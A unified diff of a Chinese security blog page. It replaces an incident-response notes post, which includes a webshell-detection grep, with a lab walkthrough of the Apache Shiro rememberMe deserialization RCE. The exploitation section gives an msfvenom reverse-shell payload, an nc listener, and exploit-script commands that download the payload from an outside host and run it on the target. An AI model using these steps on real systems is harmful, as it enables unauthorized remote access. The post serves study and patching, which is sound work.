@@ -64,7 +64,7 @@
 
 
 
-  <meta name="keywords" content="IncidentResponse,">
+  <meta name="keywords" content="shiro,exploit,">
 
 
 
@@ -77,18 +77,22 @@
 
 
 
-<meta name="description" content="记录一些应急响应中的知识点，笔记，小tips。">
-<meta name="keywords" content="IncidentResponse">
+<meta name="description" content="这两天被派去护网&amp;重保，态势感知报了一条冰蝎的远程代码执行的告警，在通过告警日志以及webshell及相关信息，红队大概是通过shiro反序列化拿到主机权限，之前一大佬还特别分享过shiro反序列化漏洞，还没来及研究就碰上了，正好这个机会研究分析一波">
+<meta name="keywords" content="shiro,exploit">
 <meta property="og:type" content="article">
-<meta property="og:title" content="应急响应笔记">
-<meta property="og:url" content="https://hexchristmas.github.io/p/9065.html">
+<meta property="og:title" content="Apache Shiro Java 反序列化漏洞分析及利用">
+<meta property="og:url" content="https://hexchristmas.github.io/p/61b8.html">
 <meta property="og:site_name" content="HexChristmas&#39;s Blog">
-<meta property="og:description" content="记录一些应急响应中的知识点，笔记，小tips。">
+<meta property="og:description" content="这两天被派去护网&amp;重保，态势感知报了一条冰蝎的远程代码执行的告警，在通过告警日志以及webshell及相关信息，红队大概是通过shiro反序列化拿到主机权限，之前一大佬还特别分享过shiro反序列化漏洞，还没来及研究就碰上了，正好这个机会研究分析一波">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2020-04-10T15:30:10.593Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/HexChristmas/Shiro_exploit/master/img/3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/HexChristmas/Shiro_exploit/master/img/1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/HexChristmas/Shiro_exploit/master/img/2.png">
+<meta property="og:updated_time" content="2020-06-05T15:49:26.560Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="应急响应笔记">
-<meta name="twitter:description" content="记录一些应急响应中的知识点，笔记，小tips。">
+<meta name="twitter:title" content="Apache Shiro Java 反序列化漏洞分析及利用">
+<meta name="twitter:description" content="这两天被派去护网&amp;重保，态势感知报了一条冰蝎的远程代码执行的告警，在通过告警日志以及webshell及相关信息，红队大概是通过shiro反序列化拿到主机权限，之前一大佬还特别分享过shiro反序列化漏洞，还没来及研究就碰上了，正好这个机会研究分析一波">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/HexChristmas/Shiro_exploit/master/img/3.png">
 
 
 
@@ -118,13 +122,13 @@
 
 
 
-  <link rel="canonical" href="https://hexchristmas.github.io/p/9065.html">
+  <link rel="canonical" href="https://hexchristmas.github.io/p/61b8.html">
 
 
 
 
 
-  <title>应急响应笔记 | HexChristmas's Blog</title>
+  <title>Apache Shiro Java 反序列化漏洞分析及利用 | HexChristmas's Blog</title>
   
 
 
@@ -241,7 +245,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://hexchristmas.github.io/p/9065.html">
+    <link itemprop="mainEntityOfPage" href="https://hexchristmas.github.io/p/61b8.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Hex Christmas">
@@ -258,7 +262,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">应急响应笔记</h1>
+          <h1 class="post-title" itemprop="name headline">Apache Shiro Java 反序列化漏洞分析及利用</h1>
         
 
         <div class="post-meta">
@@ -270,8 +274,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-10T22:36:32+08:00">
-                2020-04-10
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-13T21:47:57+08:00">
+                2019-08-13
               </time>
             
 
@@ -295,7 +299,7 @@
 
           
               <div class="post-description">
-                  记录一些应急响应中的知识点，笔记，小tips。
+                  这两天被派去护网&重保，态势感知报了一条冰蝎的远程代码执行的告警，在通过告警日志以及webshell及相关信息，红队大概是通过shiro反序列化拿到主机权限，之前一大佬还特别分享过shiro反序列化漏洞，还没来及研究就碰上了，正好这个机会研究分析一波
               </div>
           
 
@@ -312,35 +316,27 @@
       
 
       
-        <h1 id="应急响应笔记"><a href="#应急响应笔记" class="headerlink" title="应急响应笔记"></a>应急响应笔记</h1><h2 id="如何快速排查webshell？"><a href="#如何快速排查webshell？" class="headerlink" title="如何快速排查webshell？"></a>如何快速排查webshell？</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -RPn &quot;(passthru|shell_exec|system|phpinfo|base64_decode|chmod|mkdir|fopen|fclose|readfile|php_uname|eval|tcpflood|udpflood|edoced_46esab|yarra) *\(&quot; /var/www</span><br></pre></td></tr></table></figure>
-<h2 id="Dump内存指令"><a href="#Dump内存指令" class="headerlink" title="Dump内存指令"></a>Dump内存指令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcore PID</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strace -f -o xxx -e trace=open -p &lt;PID&gt;</span><br></pre></td></tr></table></figure>
-<h2 id="查找具体某天修改过的文件"><a href="#查找具体某天修改过的文件" class="headerlink" title="查找具体某天修改过的文件"></a>查找具体某天修改过的文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -newermt &quot;2018-11-27&quot; ! -newermt &quot;2018-11-29&quot;|xargs stat</span><br></pre></td></tr></table></figure>
-<h2 id="查看对应进程占用的端口号"><a href="#查看对应进程占用的端口号" class="headerlink" title="查看对应进程占用的端口号"></a>查看对应进程占用的端口号</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -anop | grep PID</span><br></pre></td></tr></table></figure>
-<h2 id="查看端口号"><a href="#查看端口号" class="headerlink" title="查看端口号"></a>查看端口号</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -anplt</span><br></pre></td></tr></table></figure>
-<h2 id="没有netstat怎么办？"><a href="#没有netstat怎么办？" class="headerlink" title="没有netstat怎么办？"></a>没有netstat怎么办？</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ss -tunlpa</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat eee.access-0628.log |awk -F &apos;&quot;&apos; &apos;&#123;print $8&#125;&apos;|sort |uniq -c|sort -rn|head</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat iis-ex190706.log |awk &apos;$2&gt;&quot;15:22:31&quot;&#123;print $2&#125;&apos; |more</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat eee.access-0628.log | awk &apos;$5&gt;&quot;[28/Jun/2019:01:16:59&quot; &#123;print $5&#125;&apos; |more</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat eee.access-0628.log | awk &apos;$5&gt;=&quot;[28/Jun/2019:01:16:59&quot; &amp;&amp; $5&lt;=&quot;[28/Jun/2019:01:18:59&quot; &#123;print $5&#125;&apos; |more</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat eee.access-0628.log | awk &apos;$5&gt;=&quot;[28/Jun/2019:01:16:59&quot; &amp;&amp; $5&lt;=&quot;[28/Jun/2019:01:18:59&quot; &#123;print $5&#125;&apos; |more</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat eee.access-0628.log |awk &apos;&#123;split($5,array,&quot;[&quot;);if(array[2]&gt;=&quot;28/Jun/2019:01:15:59&quot; &amp;&amp; array[2]&lt;=&quot;28/Jun/2019:01:17:59&quot;)&#123;print $5&#125;&#125;&apos;  |more</span><br></pre></td></tr></table></figure>
-<h2 id="访问指定资源的日志"><a href="#访问指定资源的日志" class="headerlink" title="访问指定资源的日志"></a>访问指定资源的日志</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat eee.access-0628.log | awk &apos;&#123;print $10&#125;&apos; |grep /mobile/static/ |sort|uniq -c|sort -rn|more</span><br></pre></td></tr></table></figure>
-<h2 id="访问URL排序"><a href="#访问URL排序" class="headerlink" title="访问URL排序"></a>访问URL排序</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat eee.access-0628.log |awk &apos;&#123;print $10&#125;&apos;|sort|uniq -c|sort -rn|head</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat eee.access-0628.log |cut -f 10 -d &apos; &apos; |sort|uniq -c|sort -rn|head</span><br></pre></td></tr></table></figure>
-<h2 id="统计访问量前10的时间点"><a href="#统计访问量前10的时间点" class="headerlink" title="统计访问量前10的时间点"></a>统计访问量前10的时间点</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat eee.access-0628.log |awk &apos;&#123;print $5&#125;&apos;|sort|uniq -c|sort -rn|head</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat eee.access-0628.log |cut -f 5 -d &apos; &apos; |sort|uniq -c|sort -rn|head</span><br></pre></td></tr></table></figure>
-<h2 id="统计总流量"><a href="#统计总流量" class="headerlink" title="统计总流量"></a>统计总流量</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat eee.access-0628.log |awk &apos;&#123;sum+=$13&#125; END &#123;print sum&#125;&apos;</span><br></pre></td></tr></table></figure>
-<h2 id="状态码统计"><a href="#状态码统计" class="headerlink" title="状态码统计"></a>状态码统计</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat eee.access-0628.log |awk &apos;&#123;print $12&#125;&apos; |sort|uniq -c|sort -rn|more</span><br></pre></td></tr></table></figure>
-<h2 id="勒索病毒"><a href="#勒索病毒" class="headerlink" title="勒索病毒"></a>勒索病毒</h2><ul>
-<li>备份，备份，备份！</li>
-<li>如果您不知道是谁发送了附件，请不要打开附件。</li>
-<li>在您确认该人实际向您发送附件之前，请勿打开附件，</li>
-<li>使用VirusTotal等工具扫描附件  。</li>
-<li>确保所有Windows更新一出现就立即安装！还要确保更新所有程序，尤其是Java，Flash和Adobe Reader。较旧的程序包含恶意软件分发者通常利用的安全漏洞。因此，保持更新非常重要。</li>
-<li>确保使用安装了某种使用行为检测或白名单技术的安全软件。白色上市可能是一种痛苦的训练，但如果你愿意购买它，可能会有最大的回报。</li>
-<li>使用硬密码，不要在多个站点重复使用相同的密码。</li>
-</ul>
+        <h1 id="Apache-Shiro-Java-反序列化漏洞分析及利用"><a href="#Apache-Shiro-Java-反序列化漏洞分析及利用" class="headerlink" title="Apache Shiro Java 反序列化漏洞分析及利用"></a>Apache Shiro Java 反序列化漏洞分析及利用</h1><h1 id="0x00-项目地址"><a href="#0x00-项目地址" class="headerlink" title="0x00 项目地址"></a>0x00 项目地址</h1><p><a href="https://github.com/HexChristmas/Shiro_exploit" target="_blank" rel="noopener">https://github.com/HexChristmas/Shiro_exploit</a></p>
+<h1 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h1><p>  这两天被派去护网&amp;重保，态势感知报了一条冰蝎的远程代码执行的告警，在通过告警日志以及webshell及相关信息，红队大概是通过shiro反序列化拿到主机权限，之前一大佬还特别分享过shiro反序列化漏洞，还没来及研究就碰上了正好这个机会研究分析一波，<br>shiro用remembreme这个cookie对用户进行鉴权，防止出现越权问题，它使用CookieRemembreMeManager这个类，对这个remebreme这个cookie进行序列化，然后对这个字符流进行aes加密，在对其进行base64编码，然后在返回客户端remebreme Cookie，这其实是有问题的，shiro把aes的密钥硬编码在代码里，我们可以通过调试代码发现aes加码的密钥进行解密，使用ysoserial包进行反序列化的CommonsCollections2这个方法发现密钥进行解密，生成并返回带有远程代码执行的remebreme Cookie进而反弹shell</p>
+<h1 id="0x02-漏洞环境"><a href="#0x02-漏洞环境" class="headerlink" title="0x02 漏洞环境"></a>0x02 漏洞环境</h1><h3 id="方法一：Docker环境搭建"><a href="#方法一：Docker环境搭建" class="headerlink" title="方法一：Docker环境搭建"></a>方法一：Docker环境搭建</h3><p>这里可以直接pull大佬们做好的docker的漏洞环境<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull medicean/vulapps:s_shiro_1</span><br></pre></td></tr></table></figure></p>
+<p>将docker漏洞环境的8080端口映射到本机的80端口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 80:8080 medicean/vulapps:s_shiro_1</span><br></pre></td></tr></table></figure></p>
+<h3 id="方法二：Linux虚拟机或者VPS搭建tomcat及shiro环境"><a href="#方法二：Linux虚拟机或者VPS搭建tomcat及shiro环境" class="headerlink" title="方法二：Linux虚拟机或者VPS搭建tomcat及shiro环境"></a>方法二：Linux虚拟机或者VPS搭建tomcat及shiro环境</h3><p>java环境啥的鸟都带了<br>直接去tomcat官网去下载二进制包，不用百度了，这里直接给你百度完了，<a href="http://mirror.bit.edu.cn/apache/tomcat/tomcat-8/v8.5.43/bin/apache-tomcat-8.5.43.tar.gz" target="_blank" rel="noopener">点击我进行跳转，Run！</a><br>或者你直接可以<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo wget http://mirror.bit.edu.cn/apache/tomcat/tomcat-8/v8.5.43/bin/apache-tomcat-8.5.43.tar.gz /usr/share</span><br></pre></td></tr></table></figure></p>
+<p>然后直接解压<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tar zxvf apache-tomcat-8.5.43..tar.gz</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/apache-tomcat-8.5.43/bin/startup.sh</span><br></pre></td></tr></table></figure>
+<p>我们现在只需把shiro包放到webapps下即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cp shiro.war /usr/share/apache-tomcat-8.5.43/webapps</span><br></pre></td></tr></table></figure></p>
+<p> 然后访问<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost:8080/Shiro</span><br></pre></td></tr></table></figure></p>
+<p> <img src="https://raw.githubusercontent.com/HexChristmas/Shiro_exploit/master/img/3.png" alt="shiro"></p>
+<p> 能看到这个就说明你已经启动成功了</p>
+<h1 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h1><p>用msfvenom生成payload用于反弹shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/shell_reverse_tcp LHOST= LPORT=2333 elf &gt;  payload</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/HexChristmas/Shiro_exploit/master/img/1.png" alt="msfvenom"></p>
+<p>nc监听2333端口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 2333</span><br></pre></td></tr></table></figure></p>
+<p>使用shiro的脚本进行远程代码执行漏洞利用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python shiro_exploit.py &quot;http://127.0.0.1:81&quot; &quot;wget -p /tmp/ http://172.18.24.35/payload&quot;</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python shiro_exploit.py &quot;http://127.0.0.1:81&quot; &quot;chmod +x /tmp/payload&quot;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python shiro_exploit.py &quot;http://127.0.0.1:81&quot; &quot;/tmp/payload&quot;</span><br><span class="line">&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/HexChristmas/Shiro_exploit/master/img/2.png" alt="exploit"></p>
+<h1 id="0x03-漏洞修复"><a href="#0x03-漏洞修复" class="headerlink" title="0x03 漏洞修复"></a>0x03 漏洞修复</h1><p>升级 Shiro 版本至 1.2.5 以上</p>
+<h1 id="0x4-参考文档"><a href="#0x4-参考文档" class="headerlink" title="0x4 参考文档"></a>0x4 参考文档</h1><p><a href="https://issues.apache.org/jira/browse/SHIRO-550" target="_blank" rel="noopener">https://issues.apache.org/jira/browse/SHIRO-550</a></p>
+<p><a href="https://www.seebug.org/vuldb/ssvid-92180" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-92180</a></p>
 
       
     </div>
@@ -359,12 +355,12 @@
   <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
   <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
 
-  <p><span>本文标题:</span>应急响应笔记</p>
+  <p><span>本文标题:</span>Apache Shiro Java 反序列化漏洞分析及利用</p>
   <p><span>文章作者:</span>Hex Christmas</p>
-  <p><span>发布时间:</span>2020年04月10日 - 22:36:32</p>
-  <p><span>最后更新:</span>2020年04月10日 - 23:30:10</p>
-  <p><span>原始链接:</span><a href="/p/9065.html" title="应急响应笔记">https://hexchristmas.github.io/p/9065.html</a>
-    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://hexchristmas.github.io/p/9065.html" aria-label="复制成功！"></i></span>
+  <p><span>发布时间:</span>2019年08月13日 - 21:47:57</p>
+  <p><span>最后更新:</span>2020年06月05日 - 23:49:26</p>
+  <p><span>原始链接:</span><a href="/p/61b8.html" title="Apache Shiro Java 反序列化漏洞分析及利用">https://hexchristmas.github.io/p/61b8.html</a>
+    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://hexchristmas.github.io/p/61b8.html" aria-label="复制成功！"></i></span>
   </p>
   <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
 </div>
@@ -397,7 +393,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/IncidentResponse/" rel="tag"><i class="fa fa-tag"></i> IncidentResponse</a>
+            <a href="/tags/shiro/" rel="tag"><i class="fa fa-tag"></i> shiro</a>
+          
+            <a href="/tags/exploit/" rel="tag"><i class="fa fa-tag"></i> exploit</a>
           
         </div>
       
@@ -410,8 +408,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/p/d8e0.html" rel="next" title="CVE-2018-20129漏洞分析及复现">
-                <i class="fa fa-chevron-left"></i> CVE-2018-20129漏洞分析及复现
+              <a href="/p/e5f96543.html" rel="next" title="GoogleHack常用语法">
+                <i class="fa fa-chevron-left"></i> GoogleHack常用语法
               </a>
             
           </div>
@@ -420,8 +418,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/p/8b44.html" rel="prev" title="CVE-2010-2883栈溢出漏洞分析及复现">
-                CVE-2010-2883栈溢出漏洞分析及复现 <i class="fa fa-chevron-right"></i>
+              <a href="/p/654afb94.html" rel="prev" title="Git使用技巧">
+                Git使用技巧 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -554,7 +552,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#应急响应笔记"><span class="nav-number">1.</span> <span class="nav-text">应急响应笔记</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#如何快速排查webshell？"><span class="nav-number">1.1.</span> <span class="nav-text">如何快速排查webshell？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Dump内存指令"><span class="nav-number">1.2.</span> <span class="nav-text">Dump内存指令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#查找具体某天修改过的文件"><span class="nav-number">1.3.</span> <span class="nav-text">查找具体某天修改过的文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#查看对应进程占用的端口号"><span class="nav-number">1.4.</span> <span class="nav-text">查看对应进程占用的端口号</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#查看端口号"><span class="nav-number">1.5.</span> <span class="nav-text">查看端口号</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#没有netstat怎么办？"><span class="nav-number">1.6.</span> <span class="nav-text">没有netstat怎么办？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#访问指定资源的日志"><span class="nav-number">1.7.</span> <span class="nav-text">访问指定资源的日志</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#访问URL排序"><span class="nav-number">1.8.</span> <span class="nav-text">访问URL排序</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#统计访问量前10的时间点"><span class="nav-number">1.9.</span> <span class="nav-text">统计访问量前10的时间点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#统计总流量"><span class="nav-number">1.10.</span> <span class="nav-text">统计总流量</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#状态码统计"><span class="nav-number">1.11.</span> <span class="nav-text">状态码统计</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#勒索病毒"><span class="nav-number">1.12.</span> <span class="nav-text">勒索病毒</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Apache-Shiro-Java-反序列化漏洞分析及利用"><span class="nav-number">1.</span> <span class="nav-text">Apache Shiro Java 反序列化漏洞分析及利用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-项目地址"><span class="nav-number">2.</span> <span class="nav-text">0x00 项目地址</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-概述"><span class="nav-number">3.</span> <span class="nav-text">0x01 概述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-漏洞环境"><span class="nav-number">4.</span> <span class="nav-text">0x02 漏洞环境</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#方法一：Docker环境搭建"><span class="nav-number">4.0.1.</span> <span class="nav-text">方法一：Docker环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#方法二：Linux虚拟机或者VPS搭建tomcat及shiro环境"><span class="nav-number">4.0.2.</span> <span class="nav-text">方法二：Linux虚拟机或者VPS搭建tomcat及shiro环境</span></a></li></ol></li></ol><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-漏洞利用"><span class="nav-number">5.</span> <span class="nav-text">0x02 漏洞利用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-漏洞修复"><span class="nav-number">6.</span> <span class="nav-text">0x03 漏洞修复</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x4-参考文档"><span class="nav-number">7.</span> <span class="nav-text">0x4 参考文档</span></a></li></div>
             
 
           </div>
